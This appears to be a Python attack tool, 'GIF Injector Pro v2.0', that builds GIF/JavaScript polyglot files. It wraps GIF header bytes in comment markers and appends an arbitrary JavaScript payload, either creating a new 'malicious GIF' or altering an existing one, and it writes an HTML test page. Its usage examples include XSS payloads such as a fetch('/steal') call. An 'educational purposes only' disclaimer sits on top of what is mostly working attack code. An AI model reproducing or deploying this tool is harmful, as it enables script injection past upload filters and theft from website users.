#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GIF Injector Pro v2.0 - Advanced Steganography Tool

Copyright 2023 by N3S3
Email: n3s3@myyahoo.com

Educational purposes only - For authorized penetration testing and security research.
"""

import os
import argparse
import sys
import hashlib
import json
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any
import logging

class GIFInjector:
    """
    Advanced GIF steganography tool for security research and penetration testing
    """
    
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.setup_logging()
        self.stats = {
            "files_created": 0,
            "files_infected": 0,
            "errors": 0
        }

    def setup_logging(self):
        """Setup comprehensive logging"""
        logging.basicConfig(
            level=logging.DEBUG if self.verbose else logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('gif_injector.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)

    def print_banner(self):
        """Display professional banner"""
        banner = """
╔════════════════════════════════════════════════════════════════╗
║                   GIF Injector Pro v2.0                        ║
║              Advanced Steganography Toolkit                    ║
║                    Author: N3S3                                ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_disclaimer(self):
        """Display comprehensive legal disclaimer"""
        disclaimer = """
╔════════════════════════════════════════════════════════════════╗
║                       LEGAL DISCLAIMER                         ║
╠════════════════════════════════════════════════════════════════╣
║  This tool is provided for educational and authorized          ║
║  security testing purposes only.                               ║
║                                                                ║
║  USAGE WARNINGS:                                               ║
║  • Unauthorized use is strictly prohibited                     ║
║  • Users must have explicit permission                         ║
║  • Compliance with local laws required                         ║
║  • Authors assume no liability for misuse                      ║
║                                                                ║
║  By continuing, you acknowledge understanding of these terms   ║
╚════════════════════════════════════════════════════════════════╝
        """
        print(disclaimer)
        
        if not self.get_user_consent():
            self.logger.error("User declined disclaimer. Exiting.")
            sys.exit(1)

    def get_user_consent(self) -> bool:
        """Get explicit user consent"""
        try:
            response = input("\nDo you understand and accept these terms? (yes/NO): ").strip().lower()
            return response in ['yes', 'y', 'accept']
        except KeyboardInterrupt:
            self.logger.info("Operation cancelled by user")
            return False

    def calculate_file_hash(self, file_path: Path) -> str:
        """Calculate MD5 hash of file for integrity checking"""
        try:
            with open(file_path, 'rb') as f:
                file_hash = hashlib.md5()
                while chunk := f.read(8192):
                    file_hash.update(chunk)
            return file_hash.hexdigest()
        except Exception as e:
            self.logger.error(f"Error calculating hash: {e}")
            return ""

    def validate_gif_file(self, file_path: Path) -> bool:
        """Validate if file is a proper GIF"""
        try:
            with open(file_path, 'rb') as f:
                header = f.read(6)
                return header in [b'GIF87a', b'GIF89a']
        except Exception as e:
            self.logger.error(f"File validation failed: {e}")
            return False

    def generate_malicious_gif(self, payload: bytes, output_path: Path) -> Dict[str, Any]:
        """
        Generate a new malicious GIF with embedded payload
        """
        self.logger.info(f"Generating new malicious GIF: {output_path}")
        
        # Enhanced GIF header with better obfuscation
        gif_structure = (
            b'\x47\x49\x46\x38\x39\x61'  # GIF89a signature
            b'\x2F\x2A'                  # Start comment /*
            b'\x0A\x00'                  # Logical screen width
            b'\x0A\x00'                  # Logical screen height
            b'\xF7'                      # GCT flags
            b'\x00'                      # Background color
            b'\x00'                      # Pixel aspect ratio
            b'\x2C\x00\x00\x00\x00\x0A\x00\x0A\x00\x00\x02'  # Image descriptor
            b'\x00\x3B'                  # Trailer
            b'\x2A\x2F'                  # End comment */
            b'\x3D\x31\x3B'              # JavaScript assignment =1;
        )
        
        try:
            with open(output_path, 'wb') as f:
                f.write(gif_structure[:6])  # GIF signature
                f.write(b'\x2F\x2A')        # Start comment
                f.write(gif_structure[8:])  # Rest of structure
                f.write(payload)            # Payload
                f.write(b'\x3B')            # End statement
            
            # Verify file creation
            if output_path.exists():
                file_hash = self.calculate_file_hash(output_path)
                self.stats["files_created"] += 1
                
                result = {
                    "status": "success",
                    "file_path": str(output_path),
                    "file_size": output_path.stat().st_size,
                    "md5_hash": file_hash,
                    "payload_size": len(payload)
                }
                self.logger.info(f"Successfully created malicious GIF: {result}")
                return result
            else:
                raise Exception("File creation failed")
                
        except Exception as e:
            self.logger.error(f"Failed to generate GIF: {e}")
            self.stats["errors"] += 1
            return {"status": "error", "message": str(e)}

    def inject_into_existing_gif(self, payload: bytes, original_path: Path, output_path: Path) -> Dict[str, Any]:
        """
        Inject payload into existing GIF file
        """
        self.logger.info(f"Injecting payload into: {original_path}")
        
        if not self.validate_gif_file(original_path):
            return {"status": "error", "message": "Invalid GIF file"}
        
        original_hash = self.calculate_file_hash(original_path)
        
        try:
            with open(output_path, 'wb') as fout:
                with open(original_path, 'rb') as fin:
                    content = fin.read()
                    
                    # Enhanced injection with better pattern replacement
                    modified_content = content.replace(b'\x2A\x2F', b'\x00\x00')  # Replace */
                    modified_content = modified_content.replace(b'\x2F\x2A', b'\x00\x00')  # Replace /*
                    
                    fout.write(modified_content)
                    
                    # Inject at strategic position
                    fout.seek(6, 0)  # After GIF signature
                    fout.write(b'\x2F\x2A')  # Start comment
                    fout.seek(0, 2)  # Go to end
                    fout.write(b'\x2A\x2F\x3D\x31\x3B')  # End comment and start JS
                    fout.write(payload)
                    fout.write(b'\x3B')  # End JS
            
            # Verification
            if output_path.exists() and self.validate_gif_file(output_path):
                new_hash = self.calculate_file_hash(output_path)
                self.stats["files_infected"] += 1
                
                result = {
                    "status": "success",
                    "original_file": str(original_path),
                    "output_file": str(output_path),
                    "original_hash": original_hash,
                    "new_hash": new_hash,
                    "file_size": output_path.stat().st_size,
                    "payload_size": len(payload)
                }
                self.logger.info(f"Successfully injected into GIF: {result}")
                return result
            else:
                raise Exception("Injection verification failed")
                
        except Exception as e:
            self.logger.error(f"Injection failed: {e}")
            self.stats["errors"] += 1
            return {"status": "error", "message": str(e)}

    def generate_html_test_page(self, gif_path: Path, payload: str) -> Dict[str, Any]:
        """
        Generate HTML test page for payload verification
        """
        self.logger.info("Generating HTML test page")
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF Payload Test - Security Research</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
        }}
        .container {{
            background: white;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin-top: 20px;
        }}
        .header {{
            text-align: center;
            border-bottom: 2px solid #667eea;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }}
        .test-area {{
            background: #f8f9fa;
            border: 2px dashed #667eea;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }}
        .payload-info {{
            background: #e9ecef;
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }}
        .gif-display {{
            text-align: center;
            margin: 20px 0;
        }}
        .disclaimer {{
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🖼️ GIF Payload Testing Interface</h1>
            <p>Security Research Tool - Educational Use Only</p>
        </div>
        
        <div class="disclaimer">
            <strong>⚠️ Security Notice:</strong> This is a testing interface for authorized 
            security research. Unauthorized use is prohibited.
        </div>
        
        <div class="test-area">
            <h2>🧪 Test Parameters</h2>
            <div class="payload-info">
                <strong>GIF File:</strong> {gif_path.name}<br>
                <strong>Payload Type:</strong> JavaScript Injection<br>
                <strong>Test Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            </div>
        </div>
        
        <div class="gif-display">
            <h3>🖼️ Embedded GIF Display</h3>
            <img src="{gif_path.name}" alt="Test GIF" style="max-width: 300px; border: 2px solid #667eea; border-radius: 5px;">
            <p><em>GIF file with embedded payload</em></p>
        </div>
        
        <div class="test-area">
            <h2>📊 Payload Information</h2>
            <div class="payload-info">
                <strong>Embedded JavaScript:</strong><br>
                <code>{payload[:100]}{'...' if len(payload) > 100 else ''}</code>
            </div>
        </div>
        
        <div class="disclaimer">
            <strong>🔒 Legal Compliance:</strong> This tool is intended for:<br>
            • Authorized penetration testing<br>
            • Security research and education<br>
            • Defensive security training<br>
            <strong>Illegal use is strictly prohibited.</strong>
        </div>
    </div>
    
    <script>
        // Test environment simulation
        console.log('GIF Injector Pro - Test Environment Loaded');
        console.log('Payload ready for execution in vulnerable contexts');
    </script>
</body>
</html>"""
        
        html_path = Path("gif_payload_test.html")
        try:
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.logger.info(f"HTML test page generated: {html_path}")
            return {"status": "success", "html_path": str(html_path)}
        except Exception as e:
            self.logger.error(f"Failed to generate HTML: {e}")
            return {"status": "error", "message": str(e)}

    def generate_report(self, operation: str, results: Dict[str, Any]) -> None:
        """Generate operation report"""
        report = f"""
╔════════════════════════════════════════════════════════════════╗
║                       OPERATION REPORT                         ║
╠════════════════════════════════════════════════════════════════╣
║ Operation: {operation:<45} ║
║ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<44} ║
║ Status:    {results.get('status', 'unknown'):<45} ║
╠════════════════════════════════════════════════════════════════╣"""
        
        for key, value in results.items():
            if key != 'status':
                report += f"\n║ {key}: {str(value):<50} ║"
        
        report += """
╠════════════════════════════════════════════════════════════════╣
║ Statistics:                                                    ║
║   Files Created: {:<43} ║
║   Files Infected: {:<42} ║
║   Errors: {:<47} ║
╚════════════════════════════════════════════════════════════════╝
""".format(
    self.stats["files_created"],
    self.stats["files_infected"], 
    self.stats["errors"]
)
        
        print(report)
        
        # Save report to file
        report_path = Path("gif_injector_report.txt")
        with open(report_path, 'w') as f:
            f.write(report)
        self.logger.info(f"Detailed report saved: {report_path}")

def main():
    """Main execution function"""
    parser = argparse.ArgumentParser(
        description="GIF Injector Pro v2.0 - Advanced Steganography Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Create new malicious GIF
  %(prog)s payload.gif "alert('XSS')"
  
  # Inject into existing GIF
  %(prog)s original.gif "fetch('/steal')" --inject
  
  # Verbose mode with custom output
  %(prog)s test.gif "console.log('test')" --output malicious.gif -v
  
  # Complex payload from file
  %(prog)s target.gif "$(cat payload.js)" --inject
        """
    )
    
    parser.add_argument("filename", help="GIF filename to create or modify")
    parser.add_argument("js_payload", help="JavaScript payload to inject")
    parser.add_argument("-i", "--inject", action="store_true", 
                       help="Inject into existing GIF file")
    parser.add_argument("-o", "--output", help="Custom output filename")
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Enable verbose logging")
    parser.add_argument("--no-html", action="store_true",
                       help="Skip HTML test page generation")
    
    args = parser.parse_args()
    
    # Initialize injector
    injector = GIFInjector(verbose=args.verbose)
    injector.print_banner()
    injector.print_disclaimer()
    
    try:
        # Prepare file paths
        input_path = Path(args.filename)
        output_path = Path(args.output) if args.output else Path(f"{input_path.stem}_malicious{input_path.suffix}")
        payload = args.js_payload.encode('utf-8')
        
        # Execute operation
        if args.inject:
            if not input_path.exists():
                injector.logger.error(f"Input file not found: {input_path}")
                return 1
            result = injector.inject_into_existing_gif(payload, input_path, output_path)
            operation = "Injection into Existing GIF"
        else:
            result = injector.generate_malicious_gif(payload, output_path)
            operation = "New Malicious GIF Creation"
        
        # Generate HTML test page unless disabled
        if not args.no_html and result.get('status') == 'success':
            html_result = injector.generate_html_test_page(output_path, args.js_payload)
            if html_result.get('status') == 'success':
                injector.logger.info(f"Test page: {html_result['html_path']}")
        
        # Generate final report
        injector.generate_report(operation, result)
        
        return 0 if result.get('status') == 'success' else 1
        
    except KeyboardInterrupt:
        injector.logger.info("Operation cancelled by user")
        return 1
    except Exception as e:
        injector.logger.error(f"Unexpected error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
